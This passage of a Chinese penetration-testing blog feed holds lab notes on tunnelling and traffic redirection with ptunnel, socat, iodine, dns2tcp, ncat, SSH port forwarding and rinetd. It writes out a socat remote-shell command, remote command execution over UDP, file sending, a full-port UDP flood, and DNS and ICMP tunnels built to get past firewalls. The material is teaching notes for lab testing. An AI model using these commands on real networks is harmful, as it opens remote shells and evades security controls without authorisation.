      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
    
  </entry>
  
  <entry>
    <title>ptunnel基于ICMP协议的隧道工具</title>
    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/ptunnel%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
    <published>2015-07-08T16:51:01.000Z</published>
    <updated>2020-06-02T15:00:05.533Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a><strong>ptunnel</strong></h3><p>Ping tunnel ICMP隧道工具</p></blockquote><ul><li>通过ICMP echo(ping requests)和reply(ping reply)实现隧道</li><li>适用于防火墙只允许ping出站流量的环境</li><li>支持多并发连接,性能优</li><li>支持身份验证</li><li>需要root权限</li><li>支持抓包<br>  Win:winpacap<br>  Linux:libpcap</li><li>工作过程<br>  Proxy,Client,Destination</li></ul><p><strong>Server</strong></p><pre><code>ptunnel -x 1234</code></pre><p><strong>Client</strong></p><pre><code>sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></pre><h4 id="嵌套SSH隧道"><a href="#嵌套SSH隧道" class="headerlink" title="嵌套SSH隧道"></a><strong>嵌套SSH隧道</strong></h4><pre><code>ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></pre><ul><li>ptunnel 直到目前的最新版本仍存在拒绝服务漏洞-0.72</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;ptunnel&quot;&gt;&lt;a href=&quot;#ptunnel&quot; class=&quot;headerlink&quot; title=&quot;ptunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;ptunnel&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Ping tunnel ICMP隧道工具
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="ptunnel" scheme="http://c.cat.plus/tags/ptunnel/"/>
    
      <category term="ICMP" scheme="http://c.cat.plus/tags/ICMP/"/>
    
  </entry>
  
  <entry>
    <title>socat数据流通道工具做端口转发</title>
    <link href="http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/07/Traffic_manipulation/socat%E6%95%B0%E6%8D%AE%E6%B5%81%E9%80%9A%E9%81%93%E5%B7%A5%E5%85%B7%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-07T10:21:21.000Z</published>
    <updated>2020-06-02T15:01:45.885Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a><strong>SOCAT</strong></h3></blockquote><ul><li>被称为nc++ (增强增强版的nc)<br>  双向数据流通道工具</li></ul><p><strong>连接端口</strong></p><pre><code>socat - tcp:1.1.1.1:80</code></pre><p><strong>侦听端口</strong></p><pre><code>socat - tcp4-listen:22        /    socat - tcp-l:333</code></pre><p><strong>接收文件</strong></p><pre><code>socat tcp4-listen:333 open:2.txt,creat,append</code></pre><p><strong>发送文件</strong></p><pre><code>cat 1.txt | socat - tcp4:1.1.1.1:333</code></pre><h4 id="远程shell-–服务器端"><a href="#远程shell-–服务器端" class="headerlink" title="远程shell –服务器端"></a><strong>远程shell</strong> –服务器端</h4><pre><code>Server: socat tcp-l:23 exec:sh,pty,stderrClient: socat - tcp:1.1.1.1:23</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a><strong>端口转发</strong></h4><pre><code>socat tcp4-listen:8080,fork tcp4:192.168.254.254:80</code></pre><h4 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a><strong>远程执行命令</strong></h4><pre><code>Server: socat - udp-l:2001Client: echo &quot;`id`&quot; | socat - udp4-datagram:1.1.1.1:2001</code></pre><h4 id="UDP-全端口任意内容发包"><a href="#UDP-全端口任意内容发包" class="headerlink" title="UDP 全端口任意内容发包"></a><strong>UDP 全端口任意内容发包</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PORT in &#123;1..65535&#125;; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</span><br></pre></td></tr></table></figure><h4 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a><strong>二进制编辑器</strong></h4><pre><code>echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></pre><h4 id="简单的web服务器"><a href="#简单的web服务器" class="headerlink" title="简单的web服务器"></a><strong>简单的web服务器</strong></h4><pre><code>socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SOCAT&quot;&gt;&lt;a href=&quot;#SOCAT&quot; class=&quot;headerlink&quot; title=&quot;SOCAT&quot;&gt;&lt;/a&gt;&lt;strong&gt;SOCAT&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;被称为nc++ 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="socat" scheme="http://c.cat.plus/tags/socat/"/>
    
  </entry>
  
  <entry>
    <title>DNS协议隧道iodine及ncat</title>
    <link href="http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/"/>
    <id>http://c.cat.plus/2015/07/06/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93iodine%E5%8F%8Ancat/</id>
    <published>2015-07-06T11:31:27.000Z</published>
    <updated>2020-05-29T09:15:57.980Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="iodine-碘"><a href="#iodine-碘" class="headerlink" title="iodine    #碘"></a><strong>iodine</strong>    #碘</h3><p>基于DNS查询的隧道工具<br>与同类工具相比的优点</p></blockquote><ul><li>对下行数据不进行编码,因此性能优</li><li>支持多平台:Linux,BSD,Mac OS,Windows</li><li>最大16个并发连接</li><li>强制密码支持</li><li>支持同网段隧道IP(不同于服务器,客户端网段)</li><li>支持多种DNS纪录类型</li><li>丰富的隧道质量检测措施</li></ul><p><strong>运行服务器端</strong></p><pre><code>iodined -f -c 10.0.0.1 test.lab.com-f :    前端显示(可选)-c :    不检查客户端IP地址IP :    服务器端的隧道IP地址</code></pre><p><strong>运行客户端</strong></p><pre><code>iodine -f test.lab.comcurl --socks5-hostname 127.0.0.1:7001 http://www.sina.com</code></pre><p><strong>隧道网络接口</strong></p><ul><li>不基于资源的通用隧道,如同本网段内两台相邻的主机</li><li>服务器和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务器网段</li><li>基于此隧道可嵌套其它隧道技术<br>  <code>ssh -CfNg -D 7001 root@10.0.0.1</code></li></ul><p><strong>iodine for Windows</strong><br>安装TAP网卡驱动<br><code>https://openvpn.net/index.php/open-source/downloads.html</code><br>只安装TAP Virtual Ethernet Adapter和所有依赖包<br>Windows客户端</p><pre><code>http://code.kryo.se/iodine/iodine -f test.lab.com建立SSH隧道</code></pre><blockquote><h3 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h3></blockquote><ul><li>被称为众多NC衍生版软件中最优的选择,不是一个单独的软件,包含在nmap套件中</li></ul><p><strong>代理功能</strong></p><pre><code>ncat -l 8080 --proxy-type http --proxy-auth user:pass</code></pre><p><strong>Broker中介代理功能</strong> #类似于早于交换机的hub功能</p><ul><li>AB不通但AC,BC互通</li><li>服务器: <code>ncat -l 333 --broker</code></li><li>客户端之间发送任何信息都会被hub到其他客户端</li><li>批量执行命令: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 1.1.1.1 --sh-exec &quot;echo &#96;pwd&#96;&quot;</span><br></pre></td></tr></table></figure></li><li>批量传文件: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --send-only 1.1.1.1 &lt; inputfile</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;iodine-碘&quot;&gt;&lt;a href=&quot;#iodine-碘&quot; class=&quot;headerlink&quot; title=&quot;iodine    #碘&quot;&gt;&lt;/a&gt;&lt;strong&gt;iodine&lt;/strong&gt;    #碘&lt;/h3&gt;&lt;p&gt;基于DNS查询的
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
    
      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="ncat" scheme="http://c.cat.plus/tags/ncat/"/>
    
      <category term="iodine" scheme="http://c.cat.plus/tags/iodine/"/>
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="ssh" scheme="http://c.cat.plus/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>DNS协议隧道-dns2tcp</title>
    <link href="http://c.cat.plus/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/"/>
    <id>http://c.cat.plus/2015/07/05/Traffic_manipulation/DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93-dns2tcp/</id>
    <published>2015-07-05T10:33:17.000Z</published>
    <updated>2020-05-29T09:05:10.288Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h3><p><strong>防火墙禁止TCP出站访问流量</strong></p></blockquote><ul><li>SSH隧道,端口转发全部失效</li><li>使用基于UDP协议的隧道</li><li>DNS的工作原理适合用于实现隧道</li></ul><p><strong>DNS工作原理</strong></p><ul><li>DNS隧道原理:注册受自己控制的DNS纪录</li></ul><h4 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a><strong>dns2tcp</strong></h4><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C/S(dns2tcpc / dns2tcpd)结构</li><li>通过TXT纪录加密传输数据(A纪录长度有限)</li><li>隧道建立后保持连接</li><li>默认纪录生存时间值为3秒</li></ul><p><strong>dns2tcp的作用</strong></p><ul><li>把TCP流量封装到DNS协议里面,通过DNS隧道来进行信息传递,通过这种方法可以绕过防火墙对内网的限制</li></ul><p><strong>安装</strong></p><pre><code>apt-get install dns2tcpKali默认安装</code></pre><p><strong>服务端配置文件</strong></p><pre><code>/etc/dns2tcpd.conf.dns2tcpd资源可以是其它网址</code></pre><p><strong>启动</strong></p><pre><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf-F:        #前端运行-d:    ғdebug level 1-3-f: 指定配置文件</code></pre><blockquote><p>测试环境1:</p></blockquote><ul><li>Windows 03: 安装DNS服务;配置转发器;创建区域lab.com;指派二级域test.lab.com;NS纪录指向Kali</li><li>WAF: 只允许出站 UDP 53端口流量</li><li>Bodhi: 安装dns2tcp,wireshark,firefox<br>  <code>dns2tcpc -c -k pass -d 1 -l 2222 -r ssh -z test.lab.com</code></li></ul><p><strong>资源访问</strong></p><ul><li>本地SSH资源</li><li>远程http资源</li><li>http代理(squid)<br>  <code>apt-get install squid3</code></li><li>https代理</li><li>隧道嵌套<br>  基于SSH资源将SSH动态端口转发隧道嵌套于DNS隧道中<br>  <code>ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code><br>  XP IE,Firefox使用嵌套的Socks代理上网</li><li>抓包分析DNS隧道通信</li></ul><blockquote><p>测试环境2:</p></blockquote><ul><li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP 53端口</li><li>内网DNS服务器:安装DNS服务,配置转发器到外网DNS服务器</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;DNS协议隧道&quot;&gt;&lt;a href=&quot;#DNS协议隧道&quot; class=&quot;headerlink&quot; title=&quot;DNS协议隧道&quot;&gt;&lt;/a&gt;DNS协议隧道&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;防火墙禁止TCP出站访问流量&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="squid3" scheme="http://c.cat.plus/tags/squid3/"/>
    
      <category term="dns2tcp" scheme="http://c.cat.plus/tags/dns2tcp/"/>
    
      <category term="http代理" scheme="http://c.cat.plus/tags/http%E4%BB%A3%E7%90%86/"/>
    
      <category term="DNS隧道" scheme="http://c.cat.plus/tags/DNS%E9%9A%A7%E9%81%93/"/>
    
      <category term="隧道嵌套" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97/"/>
    
      <category term="Bodhi" scheme="http://c.cat.plus/tags/Bodhi/"/>
    
      <category term="Kali" scheme="http://c.cat.plus/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>SSH远程端口转发和动态端口转发以及X协议转发</title>
    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BB%A5%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-03T11:26:37.000Z</published>
    <updated>2020-05-29T09:28:41.540Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a><strong>SSH远程端口转发</strong></h3><p>由于ACL等原因,SSH与应用连接建立方向相反</p></blockquote><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4><ul><li>SSH客户端+应用客户端位于FW一端</li><li>SSH服务端+应用服务端位于另一端</li></ul><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4><ul><li><p>SSH客户端,应用客户端位于FW两端</p></li><li><p>SSH服务端,应用服务端位于FW两端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</span><br><span class="line">ssh -CfNg -R 7001:1.1.1.11:80 root@192.168.254.118 -p 53#WEB应用端口转发</span><br><span class="line">ssh -CfNg -R 7002:1.1.1.11:3389 root@192.168.254.118 -p 53#RDP应用端口转发</span><br><span class="line">ssh -CfNg -R 7003:1.1.1.11:3333 root@192.168.254.118 -p 53#NC应用端口转发</span><br></pre></td></tr></table></figure></li><li><p>之所以称为远程,是因为SSH侦听端口开在远程的SSH Server上</p></li><li><p>侦听端口永远开在应用客户端一方</p></li><li><p>WEB,RDP,NC应用端口转发测试</p></li></ul><blockquote><h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a><strong>SSH 动态端口转发</strong></h3></blockquote><p><strong>本地,远程端口转发都需要固定应用服务器IP,Port</strong></p><ul><li>应用端口繁多,逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul><p><strong>本地侦听socks4/5代理端口</strong></p><ul><li>由SSH server决定如何转发</li><li>作为翻墙代理使用</li><li>配置客户端代理(浏览器)</li><li>使用 <strong>proxychains</strong> 支持无代理客户端<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a><strong>X 协议转发</strong></h3></blockquote><ul><li>远程登录Linux GUI运行图形化界面工具<br>  VNC<br>  X Windows</li><li>防火墙限制访问时<br>  基于SSH的X转发<br>  <code>ssh -X user@1.1.1.1 -p 53</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SSH远程端口转发&quot;&gt;&lt;a href=&quot;#SSH远程端口转发&quot; class=&quot;headerlink&quot; title=&quot;SSH远程端口转发&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH远程端口转发&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;由于ACL等原因,SSH
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="VNC" scheme="http://c.cat.plus/tags/VNC/"/>
    
      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
    
      <category term="proxychains" scheme="http://c.cat.plus/tags/proxychains/"/>
    
  </entry>
  
  <entry>
    <title>SSH隧道和SSH本地端口转发</title>
    <link href="http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2015/07/03/Traffic_manipulation/SSH%E9%9A%A7%E9%81%93%E5%92%8CSSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2015-07-02T19:23:17.000Z</published>
    <updated>2020-05-27T02:31:43.446Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a><strong>SSH 隧道</strong></h3></blockquote><h4 id="SSH支持双向通信隧道技术"><a href="#SSH支持双向通信隧道技术" class="headerlink" title="SSH支持双向通信隧道技术"></a><strong>SSH支持双向通信隧道技术</strong></h4><ul><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a><strong>SSH 本地端口转发</strong></h4></li><li>使效果类似于Rinetd</li><li>将一本地端口与远程服务器建立隧道<h4 id="建立双向安全隧道"><a href="#建立双向安全隧道" class="headerlink" title="建立双向安全隧道"></a><strong>建立双向安全隧道</strong></h4></li><li>将其它TCP端口的通信通过SSH链接来转发</li><li>用SSH作为传输层协议,对流量自动加解密</li><li>突破防火墙访问规则的限制,可用于翻墙<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a><strong>本地端口转发</strong></h4></li><li>本机侦听端口,访问转发到远程主机指定端口<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a><strong>远程端口转发</strong></h4></li><li>远程侦听端口,访问转发到本机主机指定端口<h4 id="动态隧道模式"><a href="#动态隧道模式" class="headerlink" title="动态隧道模式"></a><strong>动态隧道模式</strong></h4></li><li>动态端口转发</li></ul><blockquote><h4 id="将本地端口与远程服务器建立隧道"><a href="#将本地端口与远程服务器建立隧道" class="headerlink" title="将本地端口与远程服务器建立隧道"></a><strong>将本地端口与远程服务器建立隧道</strong></h4></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Kali默认不允许Root登录,修改以下配置</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PermitRootLogin prohibit-password#注释此项</span><br><span class="line">PermitRootLogin yes#add此项</span><br><span class="line">Port 53#更改默认端口</span><br><span class="line">PasswordAuthentication yes#取消注释此项</span><br><span class="line"></span><br><span class="line">service ssh start#Kali默认不启动SSH服务,启动SSH</span><br><span class="line">service ssh restart#修改配置后重启SSH服务</span><br><span class="line"></span><br><span class="line">本地端口转发:</span><br><span class="line">ssh -fCNg -L &lt;local listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; #本地端口转发侦听</span><br><span class="line">ssh -L 7001:192.168.1.124:80 root@192.168.1.110 -p 53</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt; </span><br><span class="line"></span><br><span class="line">-f#后台运行进程</span><br><span class="line">-N#不执行登录shell</span><br><span class="line">-g#复用访问时作为网关,支持多主机访问本地侦听端口</span><br></pre></td></tr></table></figure><ul><li>网关模式转发RDP,NC shell</li><li>端口转发基于建立起来的SSH隧道,隧道中断则端口转发中断</li><li>只能在建立隧道时创建转发,不能为已有隧道增加端口转发</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;SSH-隧道&quot;&gt;&lt;a href=&quot;#SSH-隧道&quot; class=&quot;headerlink&quot; title=&quot;SSH 隧道&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH 隧道&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;SSH支持
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
    
      <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
    
      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>流量操控技术之重定向</title>
    <link href="http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</id>
    <published>2015-07-01T08:13:37.000Z</published>
    <updated>2020-05-27T02:21:55.522Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="流量操控技术"><a href="#流量操控技术" class="headerlink" title="流量操控技术"></a><strong>流量操控技术</strong></h3></blockquote><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li><li>部分概念的实现过程略有烧脑</li></ul><h4 id="重定向-Redirection"><a href="#重定向-Redirection" class="headerlink" title="重定向 (Redirection)"></a><strong>重定向</strong> (Redirection)</h4><ul><li>IP,Port<h4 id="隧道-Tunnel"><a href="#隧道-Tunnel" class="headerlink" title="隧道 (Tunnel)"></a><strong>隧道</strong> (Tunnel)</h4></li><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点(IP2IP),端到端(Port2Port)隧道</li><li>VPN:pptp,l2tp,IPSec,SSL vpn</li></ul><h4 id="封装-Encapsulation"><a href="#封装-Encapsulation" class="headerlink" title="封装 (Encapsulation)"></a><strong>封装</strong> (Encapsulation)</h4><ul><li>通常结合在隧道中使用,使用一种协议封装一种协议(RPC o http,VoIP)</li><li>使用网关设备实现不同类型网络的互联互通</li></ul><h4 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a><strong>Rinetd</strong></h4><p>安装: <code>apt-get install rinetd</code><br>配置: <code>/etc/rinetd.conf</code><br>    <code>bindadd</code> <code>bindport</code> <code>connectadd</code> <code>connectport</code><br>运行: <code>rinetd</code></p><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a><strong>应用场景</strong></h5><ul><li>重定向web流量,突破上网限制</li><li>远程桌面重定向</li><li>nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h4><ul><li>安装monowall防火墙限制只某个端口能连接外网</li><li>一台模拟公司内网win机器,内网通过防火墙允许的端口访问Kali,由Kali重定向到外网</li><li>配置一台防火墙以外的Kali安装Rinetd作流量转发</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;流量操控技术&quot;&gt;&lt;a href=&quot;#流量操控技术&quot; class=&quot;headerlink&quot; title=&quot;流量操控技术&quot;&gt;&lt;/a&gt;&lt;strong&gt;流量操控技术&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Traf
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
